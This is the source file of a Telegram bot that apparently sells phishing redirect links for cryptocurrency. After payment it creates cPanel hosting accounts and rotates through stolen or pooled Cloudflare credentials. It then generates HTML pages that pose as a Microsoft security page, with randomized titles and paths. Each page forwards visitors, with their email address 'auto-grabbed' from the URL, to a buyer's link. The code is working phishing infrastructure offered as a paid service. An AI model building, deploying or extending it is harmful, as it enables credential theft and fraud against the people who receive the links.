import 'dotenv/config.js';
import { Telegraf, Markup } from 'telegraf';
import axios from 'axios';
import https from 'https';
import crypto from 'crypto';
import pino from 'pino';
import express from 'express';
import http from 'http';
import path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();

// Serve your dashboard
app.get('/dashboard', (_, res) => {
  res.sendFile(path.join(__dirname, 'dashboard.html'));
});

// Logger
const baseLog = pino({ level: process.env.LOG_LEVEL || 'info' });
const L = id => baseLog.child({ reqId: id });

// ALWAYS trust self-signed certs
const tlsAgent = new https.Agent({ rejectUnauthorized: false });

// Random helpers
const rInt = (a, b) => Math.floor(Math.random() * (b - a + 1)) + a;
const rStr = (l, s = 'abcdefghijklmnopqrstuvwxyz0123456789') =>
  [...Array(l)].map(() => s[rInt(0, s.length - 1)]).join('');
const rFile = () => rStr(120) + '.html';

// cPanel/WHM client
const WHM = axios.create({
  baseURL: process.env.WHM_SERVER,
  httpsAgent: tlsAgent,
  timeout: 15000,
  headers: {
    Authorization:
      'Basic ' +
      Buffer.from(
        `${process.env.WHM_USERNAME}:${process.env.WHM_PASSWORD}`,
        'utf8'
      ).toString('base64'),
  },
});

async function createAccount(domain, log) {
  const user = (
    domain.replace(/[^a-zA-Z0-9]/g, '').slice(0, 3).toLowerCase() +
    rStr(5)
  ).slice(0, 8);
  const pass = rStr(
    14,
    'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()'
  );
  const params = new URLSearchParams({
    domain,
    username: user,
    password: pass,
    plan: process.env.WHM_PACKAGE_NAME,
  });

  const { data } = await WHM.post('/json-api/createacct?api.version=1', params);

  if (!data?.metadata || data.metadata.result !== 1) {
    throw new Error(data?.metadata?.reason || 'createacct failed');
  }

  return { user, ip: data.data.ip };
}

const mkdir = (u, f) =>
  WHM.get('/json-api/cpanel', {
    params: {
      cpanel_jsonapi_user: u,
      cpanel_jsonapi_apiversion: 2,
      cpanel_jsonapi_module: 'Fileman',
      cpanel_jsonapi_func: 'mkdir',
      path: 'public_html',
      name: f,
    },
  });

const saveHtml = (u, f, file, html) =>
  WHM.post('/json-api/cpanel', null, {
    params: {
      cpanel_jsonapi_user: u,
      cpanel_jsonapi_apiversion: 3,
      cpanel_jsonapi_module: 'Fileman',
      cpanel_jsonapi_func: 'save_file_content',
      dir: `/home/${u}/public_html/${f}`,
      file,
      content: html,
      from_charset: 'UTF-8',
      to_charset: 'UTF-8',
    },
  });

// Cloudflare creds rotation
const cfCreds = Array.from({ length: 15 }, (_, i) => ({
  email: process.env[`CF_EMAIL_${i + 1}`],
  key: process.env[`CF_KEY_${i + 1}`],
  tok: process.env[`CF_TOKEN_${i + 1}`],
})).filter(c => c.email || c.tok);

const cfAxios = c =>
  axios.create({
    baseURL: 'https://api.cloudflare.com/client/v4',
    headers: c.tok
      ? { Authorization: `Bearer ${c.tok}` }
      : { 'X-Auth-Email': c.email, 'X-Auth-Key': c.key },
    timeout: 15000,
  });

let lastUsedIndex = 0;
async function setupCF(domain, ip, log) {
  const max = cfCreds.length;

  for (let i = 0; i < max; i++) {
    const idx = (lastUsedIndex + i) % max;
    const cred = cfCreds[idx];
    const cf = cfAxios(cred);

    try {
      const existing = await cf.get(`/zones?name=${domain}`);
      const zone = existing.data.result[0] ||
        (await cf.post('/zones', { name: domain, jump_start: true })).data.result;

      for (const r of [
        { type: 'A', name: domain, content: ip, proxied: true },
        { type: 'CNAME', name: 'www', content: domain, proxied: false },
      ]) {
        await cf.post(`/zones/${zone.id}/dns_records`, { ...r, ttl: 120 })
          .catch(err => log.warn({ err: err.message }, 'DNS record failed'));
      }

      await cf.patch(`/zones/${zone.id}/settings/ssl`, { value: 'full' });

      // ✅ Force HTTPS (redirect all http ➜ https)
await cf.patch(`/zones/${zone.id}/settings/always_use_https`, { value: 'on' });

// ✅ Opportunistic Encryption (recommended by Cloudflare)
await cf.patch(`/zones/${zone.id}/settings/opportunistic_encryption`, { value: 'on' });

// ✅ Automatic HTTPS Rewrites
await cf.patch(`/zones/${zone.id}/settings/automatic_https_rewrites`, { value: 'on' });

      lastUsedIndex = (idx + 1) % max;

      const ns = zone.name_servers ||
        (await cf.get(`/zones/${zone.id}`)).data.result.name_servers;

      log.info({ zone: zone.id }, 'Cloudflare OK');
      return ns;
    } catch (err) {
      log.warn({ err: err.message, credIndex: idx }, 'CF credential failed');
    }
  }

  throw new Error('Cloudflare failed for all credentials');
}

// Crypto pricing
async function getCryptoPrice(symbol) {
  const res = await axios.get(
    `https://api.coinbase.com/v2/prices/${symbol}-USD/spot`
  );
  return parseFloat(res.data.data.amount);
}

// ── Sessions & Admin Codes ──
const sessions = new Map();
const adminCodes = new Map();

function getSession(ctx) {
  const id = ctx.from.id;
  if (!sessions.has(id)) sessions.set(id, {});
  return sessions.get(id);
}

// ── Bot Initialization ──
const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);

// ✅ Make sure webhook is only set once in deployment or use polling locally
bot.telegram.setWebhook(`${process.env.WEBHOOK_DOMAIN}/bot${process.env.TELEGRAM_BOT_TOKEN}`);

// ── /start ──
bot.start(ctx => {
  return ctx.reply(
    '💼 Choose a plan to proceed:',
    Markup.inlineKeyboard([
      [Markup.button.callback('💰 $70 Plan (2 Links)', 'plan_70')],
      [Markup.button.callback('💰 $80 Plan (3 Links)', 'plan_80')],
      [Markup.button.callback('🛠 Admin Access', 'admin_access')],
    ])
  );
});

// ── Admin Access ──
bot.action('admin_access', async ctx => {
  await ctx.answerCbQuery();
  const code = rInt(10000000, 99999999).toString();
  adminCodes.set(ctx.from.id, code);

  await bot.telegram.sendMessage(
    process.env.ADMIN_ID,
    `🔐 *Admin Code Requested by* @${ctx.from.username || ctx.from.id}\nHere is the code: \`${code}\``,
    { parse_mode: 'Markdown' }
  );

  return ctx.reply('🔐 Enter the 8-digit admin access code:');
});

// ── Plan Selection ──
bot.action(/plan_(70|80)/, async ctx => {
  await ctx.answerCbQuery();
  const plan = +ctx.match[1];
  const session = getSession(ctx);
  session.planAmount = plan;

  return ctx.editMessageText(
    `You've selected the $${plan} plan. Choose a payment method:`,
    Markup.inlineKeyboard([
      [Markup.button.callback('BTC', 'pay_btc')],
      [Markup.button.callback('USDT', 'pay_usdt')],
      [Markup.button.callback('⬆️ Back', 'plan_back')],
    ])
  );
});

// ── Go Back to Start ──
bot.action('plan_back', async ctx => {
  await ctx.answerCbQuery();
  return ctx.editMessageText(
    '💼 Choose a plan to proceed:',
    Markup.inlineKeyboard([
      [Markup.button.callback('💰 $70 Plan (2 Links)', 'plan_70')],
      [Markup.button.callback('💰 $80 Plan (3 Links)', 'plan_80')],
      [Markup.button.callback('🛠 Admin Access', 'admin_access')],
    ])
  );
});

// ── Payment Method Selected ──
bot.action(/pay_(btc|usdt)/, async ctx => {
  await ctx.answerCbQuery();

  const cur = ctx.match[1].toUpperCase();
  const session = getSession(ctx);
  session.crypto = cur;

  const totalUSD = session.planAmount + 2;
  const price = await getCryptoPrice(cur);

  session.cryptoAmount = (totalUSD / price).toFixed(8);
  session.wallet = cur === 'BTC' ? process.env.BTC_WALLET : process.env.USDT_WALLET;

  return ctx.reply(`💸 *Payment Instructions:*

*Plan:* $${session.planAmount}  
*Fee:* $2  
*Total:* $${totalUSD}

Send *${session.cryptoAmount} ${cur}* to:  
\`${session.wallet}\`

Then click below once paid.`,
    {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: '✅ I Have Sent', callback_data: 'confirm_payment' }],
          [{ text: '⬜️ Back', callback_data: 'plan_back' }],
        ],
      },
    });
});

// ── Confirm Payment ──
bot.action('confirm_payment', async ctx => {
  await ctx.answerCbQuery();
  const session = getSession(ctx);
  session.awaiting_txid = true;
  return ctx.reply('🔗 Please paste the transaction hash / blockchain TXID:');
});

// ── Main Text Handler ──
bot.on('text', async ctx => {
  const session = getSession(ctx);
  const msg = ctx.message.text.trim();

  // 🔐 Admin Code Flow
  if (session.awaiting_admin_code) {
    session.awaiting_admin_code = false;
    const correct = adminCodes.get(ctx.from.id);

    if (msg === correct) {
      session.awaiting_domain_link = true;
      return ctx.reply('✅ Admin Verified! Enter your domain and link + autograb:', {
        parse_mode: 'Markdown',
      });
    } else {
      return ctx.reply('❌ Invalid admin code.');
    }
  }

  // 💸 TXID Flow
  if (session.awaiting_txid) {
    session.awaiting_txid = false;
    session.txid = msg;

    await bot.telegram.sendMessage(
      process.env.ADMIN_ID,
      `⚠️ *Payment Verification Needed:*
👤 User: @${ctx.from.username || ctx.from.id}  
💰 Plan: $${session.planAmount}  
💱 Crypto: ${session.crypto}  
📊 Sent: ${session.cryptoAmount}  
🔗 TXID: \`${session.txid}\``,
      {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [{ text: '✅ Accept', callback_data: `accept_${ctx.from.id}` }],
            [{ text: '❌ Reject', callback_data: `reject_${ctx.from.id}` }],
          ],
        },
      }
    );

    return ctx.reply('⏳ Payment submitted. Awaiting admin approval.');
  }

 

  // ── Domain/link provisioning ──
if (session.awaiting_domain_link) {
  session.awaiting_domain_link = false;
  const txt = ctx.message.text.trim();

  // Extract domain and URL
  const domain = (txt.match(/([\w.-]+\.[A-Za-z]{2,})/) || [])[1];
  const link = (txt.match(/https?:\/\/\S+/) || [])[0];

  // Validate input
  if (!domain || !link) {
    session.awaiting_domain_link = true;
    return ctx.reply('❌ Invalid format. Use: `domain.com https://link.com`', {
      parse_mode: 'Markdown',
    });
  }

  // 1) Create hosting account
  await ctx.reply(`🔄 Processing domain: ${domain}`);
  const lg = L(crypto.randomUUID().slice(0, 8));
  let user, ip;

  try {
    ({ user, ip } = await createAccount(domain, lg));
  } catch (err) {
    return ctx.reply(`❌ WHM Error: ${err.message}`);
  }

  // 2) Cloudflare setup
  await ctx.reply(`🔄 Configuring Cloudflare for protection…`);
  let nameservers;

  try {
    nameservers = await setupCF(domain, ip, lg);
  } catch (err) {
    return ctx.reply(`❌ Cloudflare Error: ${err.message}`);
  }

// 3) Create 3 redirect pages
const urls = await Promise.all(
  Array.from({ length: 3 }, async () => {
    const folder = rInt(100, 999).toString();
    const file = rFile();
    const delay = rInt(100, 599);
    const title = rStr(155);

    try {
      await mkdir(user, folder);

      const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>${title}</title>
  <script>
    document.addEventListener('DOMContentLoaded', function () {
      setTimeout(redirect, ${delay});
    });

    function redirect() {
      var email = getParameterByName('email');
      var redirectUrl = "${link}";

      if (email) {
        redirectUrl += email;
      } else {
        console.log("No email provided. Redirecting without email.");
      }

      console.log("Redirecting to: " + redirectUrl);
      window.location.href = redirectUrl;
    }

    function getParameterByName(name, url = window.location.href) {
      name = name.replace(/[\$begin:math:display$\\$end:math:display$]/g, '\\\\$&');
      var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)');
      var results = regex.exec(url);
      if (!results) return null;
      if (!results[2]) return '';
      return decodeURIComponent(results[2].replace(/\\+/g, ' '));
    }

    function handleCheckboxClick(checkbox) {
      if (checkbox.checked) {
        console.log("Checkbox is checked. Redirecting...");
        redirect();
      } else {
        console.log("Checkbox is not checked.");
      }
    }
  </script>
</head>
<body>
  <div style="display: flex; justify-content: center; align-items: center; font-family: Arial, sans-serif;">
    <div style="display: flex; flex-direction: column;">
      <div style="display: flex;">
        <div style="width: 20px; height: 20px; background-color: #F25022; margin-right: 2px;"></div>
        <div style="width: 20px; height: 20px; background-color: #7FBA00;"></div>
      </div>
      <div style="display: flex; margin-top: 2px;">
        <div style="width: 20px; height: 20px; background-color: #00A4EF; margin-right: 2px;"></div>
        <div style="width: 20px; height: 20px; background-color: #FFB900;"></div>
      </div>
    </div>
    <div style="font-size: 24px; font-weight: normal; color: #5E5E5E; margin-left: 10px;">
      Microsoft
    </div>
  </div> 
  <label>
    <input type="checkbox" onclick="handleCheckboxClick(this)">
    Redirecting you to Microsoft security page... or click this box to continue anyway.
  </label>
</body>
</html>`;
     
      await saveHtml(user, folder, file, html);
      return `https://${domain}/${folder}/${file}`;
    } catch (err) {
      lg.error({ err: err.message, folder, file }, 'HTML generation failed');
      return `❌ Failed to create redirect for ${domain}`;
    }
  })
);

// ── Final, nicely formatted summary ──
return ctx.replyWithMarkdown(`
✅ *Closed‑Store Redirect Link*

• link 1: \`${urls[0]}\`
  
• link 2: \`${urls[1]}\` 
 
• link 3: \`${urls[2]}\`  

*Add CF Name‑servers 🛠 to your domain DNS:*  
\`${nameservers.join(' | ')}\`

*Use \`?email=\` for auto‑grab:*  
_e.g._  
\`https://${domain}/${urls[0].split('/').slice(3).join('/')}?email=you@example.com\`
`.trim(), { disable_web_page_preview: true });
}
});

// ── Admin Accept/Reject ──
bot.action(/accept_(\d+)/, async ctx => {
  await ctx.answerCbQuery();
  const uid = Number(ctx.match[1]);
  getSession({ from: { id: uid } }).awaiting_domain_link = true;
  await bot.telegram.sendMessage(uid, '✅ Payment accepted! Enter your domain/link to provision.');
  return ctx.editMessageText('✅ Accepted. Waiting for user’s domain/link.');
});

bot.action(/reject_(\d+)/, async ctx => {
  await ctx.answerCbQuery();
  const uid = Number(ctx.match[1]);
  await bot.telegram.sendMessage(uid, '❌ Payment rejected. Please contact support.');
  return ctx.editMessageText('❌ Rejected.');
});

// ── /update Command ──
bot.command('update', async ctx => {
  const [domain, rel] = ctx.message.text.split(/\s+/).slice(1);
  if (!domain || !rel)
    return ctx.reply('Usage: /update <domain> <folder/file.html>');

  const lg = L('upd-' + crypto.randomUUID().slice(0, 4));
  try {
    const list = await WHM.get('/json-api/listaccts?api.version=1');
    const user = list.data.data.acct.find(a => a.domain === domain)?.user;
    if (!user) throw new Error('Domain not found');

    const [folder, file] = rel.split('/');
    if (!folder || !file) throw new Error('Invalid path: use folder/file.html');

    await saveHtml(user, folder, file, '<html><body><h1>Updated!</h1></body></html>');
    ctx.reply('✅ File overwritten');
    lg.info({ domain, rel }, 'updated');
  } catch (e) {
    ctx.reply(`❌ ${e.message}`);
    lg.error({ err: e.stack }, 'update failed');
  }
});

// ── Launch Webhook & HTTP Server ──
app.use(bot.webhookCallback(`/bot${process.env.TELEGRAM_BOT_TOKEN}`));
app.get('/', (_, res) => res.send('Bot running ✅'));

const PORT = process.env.PORT || 10000;
http.createServer(app).listen(PORT, () => {
  baseLog.info(`Webhook server listening on :${PORT}`);
});